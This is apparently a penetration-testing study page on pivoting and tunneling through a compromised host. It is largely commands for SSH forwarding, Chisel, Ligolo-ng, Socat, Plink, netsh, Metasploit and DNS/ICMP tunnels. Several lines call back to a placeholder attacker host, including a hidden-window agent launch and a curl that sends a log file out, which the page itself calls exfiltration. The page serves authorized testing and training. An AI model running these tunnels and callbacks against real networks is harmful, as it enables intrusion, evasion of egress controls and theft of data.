# Pivoting & Tunneling

After the first foothold you're rarely on the target network directly. Pivoting routes your tools *through* the compromised host to reach machines you otherwise can't touch. The PNPT internal expects you to reach a second, hidden subnet from your foothold — this is how you get there and how you keep [Lateral Movement](lateral-movement.md) tools working across the boundary.

{% hint style="warning" %}
Through a SOCKS proxy, use **TCP connect** scans only (`nmap -sT -Pn`). SYN (`-sS`), UDP, and ICMP scans send half-packets or raw frames that SOCKS can't relay — they fail silently. `-Pn` is mandatory because host discovery pings get dropped too.
{% endhint %}

## First: find the hidden network

Once you have a shell on the pivot host, look at what *it* can see that you can't:

```bash
# Linux pivot
ip a ; ip route          # what subnets is this host on?
arp -a                   # who has it been talking to?
cat /etc/hosts
```

```powershell
# Windows pivot
ipconfig /all
route print
arp -a
Get-NetNeighbor
```

A second interface (e.g. `10.10.x.x` when you came in on `192.168.x.x`) is your target subnet.

## Choosing a technique

| Need | Linux pivot | Windows pivot |
| --- | --- | --- |
| SOCKS proxy (scan / many hosts) | `ssh -D` or Chisel | Chisel reverse or Plink `-D` |
| Single port forward | `ssh -L` | `netsh portproxy` or `plink -L` |
| Reverse shell from isolated host | `ssh -R`, Socat | Chisel reverse |
| Full transparent subnet access | Ligolo-ng or sshuttle | Ligolo-ng |
| Only DNS/ICMP egress allowed | dnscat2 / ptunnel-ng | dnscat2 / ptunnel-ng |

**Mental model:** a SOCKS proxy (dynamic / chisel) routes *many* tools at an *entire subnet*; a port forward pins *one* internal service to a local port; Ligolo gives you a real interface and no wrapper. Pick the lightest thing that reaches your target.

## SSH tunneling (no tools to upload)

If you have SSH creds on the pivot, you already have everything.

### SSH flag reference

| Flag | Type | Purpose |
| --- | --- | --- |
| `-D` | Dynamic | SOCKS proxy for a whole subnet |
| `-L` | Local | Forward a local port to a remote service |
| `-R` | Remote | Receive reverse connections through the pivot |
| `-J` | ProxyJump | Chain through intermediate hosts |
| `-N` | — | No command execution (forwarding only) |
| `-f` | — | Background the SSH process |

### Dynamic (SOCKS proxy) — the workhorse

```bash
ssh -D 9050 -N -f user@<PIVOT_HOST>
```

Then point proxychains at it:

```bash
echo "socks5 127.0.0.1 9050" | sudo tee -a /etc/proxychains.conf
proxychains nmap -sT -Pn <INTERNAL_TARGET>
proxychains crackmapexec smb <INTERNAL_SUBNET>/24
proxychains curl http://<INTERNAL_TARGET>
```

### Local forward — pin one remote port to localhost

```bash
ssh -L 3306:192.168.1.50:3306 user@<PIVOT_HOST>      # reach internal MySQL as local:3306
ssh -L 8080:192.168.1.50:80 user@<PIVOT_HOST>        # internal web server
mysql -h 127.0.0.1 -P 3306 -u root                    # then connect locally
```

### Remote / reverse forward — pivot can't reach you inbound

```bash
ssh -R <PIVOT_INTERNAL_IP>:8080:0.0.0.0:8000 user@<PIVOT_HOST> -vN
# Reverse SOCKS (modern OpenSSH ≥7.6 both ends) — pivot exposes SOCKS on Kali:
ssh -N -R 9998 kali@<ATTACKER_IP>       # Kali gets a SOCKS listener on 127.0.0.1:9998
```

Reverse SOCKS is perfect when the pivot is outbound-only but has an SSH client — most Windows 10/11 hosts fit (`ssh.exe` ships in-box since 1809).

### ProxyJump — chain hops transparently

```bash
ssh -J user1@pivot user2@internal_target             # kali → pivot → internal
ssh -J user1@pivot1,user2@pivot2 user3@target        # multi-hop
```

Write it once in `~/.ssh/config` and reuse forever:

```
Host pivot
  HostName 10.0.0.5
  User pentest
  IdentityFile ~/.ssh/pivot.key

Host db
  HostName 10.4.50.215
  User dbadmin
  ProxyJump pivot          # ssh db → jumps through pivot automatically

Host hrs
  HostName 172.16.50.217
  User hr_admin
  ProxyJump db             # nested: kali → pivot → db → hrs
```

### Keepalive for long-idle tunnels

Idle `-N` tunnels die when a middlebox drops the session. Keep them alive:

```bash
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=5 -N -D 9050 user@pivot
```

## Chisel — SOCKS over HTTP (upload one binary)

When there's no SSH, chisel tunnels over HTTP and is the PNPT favorite. **Reverse mode** (server on your attacker box) works even when the pivot is behind NAT.

```bash
# Attacker (server)
sudo ./chisel server --reverse -v -p 1234 --socks5

# Pivot (client) — dials back to you
./chisel client -v <ATTACKER_IP>:1234 R:socks
```

That gives you a SOCKS5 proxy on `127.0.0.1:1080` — add `socks5 127.0.0.1 1080` to proxychains and go. Forward a single port instead:

```bash
./chisel client <ATTACKER_IP>:8080 R:80:172.16.6.241:80    # expose internal:80 on your localhost:80
```

### Forward-spec reference

| Spec | Direction | Behaviour |
| --- | --- | --- |
| `<port>` | client → server | listen on client port, forward to server's dial target |
| `<lport>:<host>:<rport>` | client → server | forward local port to `<host>:<rport>` as seen by server |
| `socks` | client → server | client listens 127.0.0.1:1080 SOCKS, egress from server |
| `R:<rport>` | server → client | server listens, forwards to client's dial target |
| `R:<rport>:<host>:<port>` | server → client | server listens, forwards to `<host>:<port>` as seen by client |
| `R:socks` | server → client | server exposes SOCKS on 127.0.0.1:1080, egress from client |
| `0.0.0.0:<port>:...` | bind all ifaces | prefix any spec to make the listener external |

Server flags: `--reverse` (allow `R:*`), `--socks5`, `--auth user:pass`, `--tls-cert`/`--tls-key`, `--keepalive 25s`, `-v`/`-vv`.

{% hint style="info" %}
Old target throwing `GLIBC_2.34 not found`? The default release is built against modern glibc. Use the pinned `chisel_1.8.1_linux_amd64` build — it's glibc-2.17 compatible (works on CentOS 6 / Ubuntu 14.04 / RHEL 7).
{% endhint %}

Silent failure (client returns 0 but nothing tunnels)? Capture its output and exfil it:

```bash
/tmp/chisel client <ATTACKER_IP>:8080 R:socks &> /tmp/chisel.log
curl --data @/tmp/chisel.log http://<ATTACKER_IP>:8888/      # nc -nvlp 8888 on Kali to read
```

## Ligolo-ng — transparent TUN tunnel (cleanest)

No proxychains, no SOCKS quirks — you get a real network interface to the target subnet.

```bash
# One-time: create the tun interface on your box (one per agent)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Attacker: start the proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Pivot: connect the agent back
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
```

Windows agent:

```powershell
Start-Process -FilePath C:\temp\agent.exe -ArgumentList "-connect <ATTACKER_IP>:11601 -ignore-cert" -WindowStyle Hidden
```

In the proxy console, select the session and add routes:

```bash
ligolo-ng » session                              # pick the agent
[Agent] » tunnel_start --tun ligolo
[Agent] » route_add --tun ligolo --route <INTERNAL_SUBNET>/24
sudo ip route | grep ligolo                       # verify
```

After that your tools reach the subnet directly — no wrapper:

```bash
nmap -Pn -sT -p 22,135,139,445,1433,3389,5985 <INTERNAL_TARGET>
impacket-psexec <DOMAIN>/<USER>:<PASSWORD>@<INTERNAL_TARGET>
evil-winrm -i <INTERNAL_TARGET> -u <USER> -p <PASSWORD>
```

### Multi-hop (double / triple pivot)

Chain agents by opening a listener on the first pivot that the second agent connects through:

```bash
# On attacker, in session 1 (Host A):
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp

# On Host B (reaches A, not the attacker):
C:\temp\agent.exe -connect <HOST_A_IP>:11602 -ignore-cert

# On attacker, select session 2 and route the deeper subnet:
ligolo-ng » session      # pick 2
[Agent] » tunnel_start --tun ligolo2
[Agent] » route_add --tun ligolo2 --route <SUBNET_2>/24
```

### Listeners for reverse shells

Forward reverse-shell / SMB-relay traffic back through a pivot:

```
[Agent] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
[Agent] » listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
```

### Troubleshooting

* Tunnel drops → run the agent as root/SYSTEM, wrap in `nohup`/`screen`, check pivot firewall.
* `already running` on tunnel start → use a different interface (`--tun ligolo2`).
* Can't scan → verify route (`ip route | grep ligolo`) and interface up; use `-sT` first.

## sshuttle — poor man's VPN

Transparent iptables-based routing over SSH. No proxychains needed.

```bash
sshuttle -vvr user@<PIVOT_HOST> 10.1.1.0/24
sshuttle -r user@pivot 0/0                                 # tunnel everything
sshuttle -r user@pivot 10.0.0.0/8 --dns                    # include DNS
sshuttle -r user@pivot -N                                   # auto-detect subnets from pivot routes
sshuttle -r user@pivot 10.0.0.0/8 -e "ssh -J bastion@10.0.0.1 -i ~/.ssh/pivot.key -p 2222"
```

## Socat — quick port relay

```bash
socat TCP4-LISTEN:8080,fork TCP4:<ATTACKER_IP>:80          # pivot:8080 → your box:80
socat OPENSSL-LISTEN:8443,fork,cert=cert.pem,verify=0 TCP:<internal>:80   # TLS-wrapped
socat -T30 UDP-LISTEN:53,fork UDP:<internal-DNS>:53        # UDP relay (DNS/SNMP)
socat TCP:<ATTACKER_IP>:9999 TCP:<internal>:22             # reverse relay (outbound-only pivot)
```

Common flags: `,fork` (multi-client), `,reuseaddr` (rebind fast), `-T <sec>` (idle timeout), `-v` (log traffic).

## Windows-native tools

### Plink (PuTTY Link)

```bash
plink -ssh -D 9050 ubuntu@<PIVOT_HOST>                     # dynamic SOCKS
plink -ssh -L 3389:<INTERNAL_TARGET>:3389 ubuntu@<PIVOT_HOST>   # local forward
```

Reverse RDP through an outbound-only Windows pivot:

```powershell
C:\Windows\Temp\plink.exe -ssh -l kali -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 <ATTACKER_IP>
# On Kali (sshd running): xfreerdp /u:rdp_admin /p:'P@ssw0rd!' /v:127.0.0.1:9833
```

### netsh portproxy (built-in)

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=<PIVOT_IP> connectport=3389 connectaddress=<TARGET_IP>
netsh interface portproxy show all
netsh advfirewall firewall add rule name="pivot" protocol=TCP dir=in localip=<PIVOT_IP> localport=8080 action=allow
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=<PIVOT_IP>
```

## Metasploit pivoting

If your foothold is a Meterpreter session:

```
meterpreter > run autoroute -s 10.10.10.0/24          # route through the session

# SOCKS proxy for external tools
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 9050
set VERSION 5
run -j
# then: proxychains nmap -sT -Pn <INTERNAL_TARGET>

# Single port forward
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
```

## proxychains — the SOCKS-version gotcha

A version mismatch **fails silently** or logs `Unsupported SOCKS version`. Match the line to your tunnel:

| Tunnel | proxychains line |
| --- | --- |
| SSH `-D` | `socks5 127.0.0.1 9050` |
| Chisel `--socks5` | `socks5 127.0.0.1 1080` |
| MSF socks_proxy VERSION 4a | `socks4 127.0.0.1 9050` |
| MSF socks_proxy VERSION 5 | `socks5 127.0.0.1 9050` |
| Ligolo-ng / sshuttle | none — they use TUN / iptables, no proxychains |

Recommended baseline `/etc/proxychains.conf`:

```
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
```

## Enumerate an internal subnet with no nmap

On a pivot with a second NIC but no tools, sweep with bash + nc:

```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445 2>&1 | grep succeeded; done
```

```powershell
1..254 | ForEach-Object {
  $ip = "172.16.50.$_"
  if ((New-Object Net.Sockets.TcpClient).ConnectAsync($ip, 445).Wait(1000)) { "$ip 445 open" }
}
```

## Constrained-egress tunneling (DNS / ICMP only)

When only DNS or ICMP leaves the network:

```bash
# DNS — dnscat2
ruby dnscat2.rb --dns host=<ATTACKER_IP>,port=53,domain=<DOMAIN> --no-cache      # attacker
./dnscat --dns server=<ATTACKER_IP>,port=53                                        # target
# In the dnscat2 shell: window -i 1 → shell / listen 127.0.0.1:4455 <INTERNAL>:445

# ICMP — ptunnel-ng
sudo ptunnel-ng -r<PIVOT_IP> -R22                                                  # pivot (server)
sudo ptunnel-ng -p<PIVOT_IP> -l2222 -r<PIVOT_IP> -R22                              # attacker
ssh -D 9050 -p 2222 -l <USER> 127.0.0.1                                            # SOCKS over ICMP-SSH
```

## Loopback-only service tricks

* **Chisel reverse to look like loopback** — a `127.0.0.1`-only IP ACL (Zabbix maintenance, loopback-only Jenkins, PostgreSQL `trust`, MySQL `skip-networking`) falls to `./chisel client <ATTACKER_IP>:9001 R:8888:127.0.0.1:80` — the request originates from the target's own loopback.
* **Open Squid proxy** — a misconfigured Squid on 3128 that allows `http://127.0.0.1/` reaches the box's loopback services: `curl -s -x http://<TARGET>:3128 http://127.0.0.1/`.

## Pivoting decision tree

```
Compromised host has access to an internal network?
    ├── YES
    │    ├── SOCKS proxy (scan/many hosts)  → SSH -D / Chisel reverse / Ligolo
    │    ├── Single port forward            → SSH -L / netsh portproxy / plink -L
    │    └── Reverse shell from isolated host → SSH -R / Socat / Chisel reverse
    └── NO → direct access, no pivoting needed
```

## Workflow

```
# 1. On the pivot: ip a / ipconfig — find the second subnet
# 2. Pick a tunnel: Ligolo (cleanest) > Chisel reverse (no SSH) > ssh -D (have SSH)
# 3. Stand up the tunnel; verify a listener/route exists (ss -tlnp / ip route)
# 4. Sweep the subnet: nmap -sT -Pn (through proxychains) or native to Ligolo
# 5. Run lateral-movement tools through the tunnel; keep it alive with keepalives
# 6. Deeper subnet? add a second agent/hop and repeat
```

## Report notes

Document each tunnel you built — the client needs to understand how deep you reached and the exact path. Note the technique, the pivot host, and every subnet you exposed.

## Related

* [Lateral Movement](lateral-movement.md) — the tools you run *through* the tunnel
* [Credential Dumping](credential-dumping.md) — creds harvested on the pivot open the next subnet
* [Shells & Payloads](shells-payloads.md) — reverse shells routed back through a pivot listener
* [File Transfers](file-transfers.md) — stage chisel/ligolo agents onto the pivot
* [Windows Privesc](windows-privesc-methodology.md) · [Linux Privesc](linux-privesc-methodology.md) — root/SYSTEM on the pivot makes tunnels stable
* [AD Attacks](ad-attacks.md) — reaching a DC on a hidden subnet is usually the point
* [Report Writing](report-writing.md) — documenting reach and path for the client
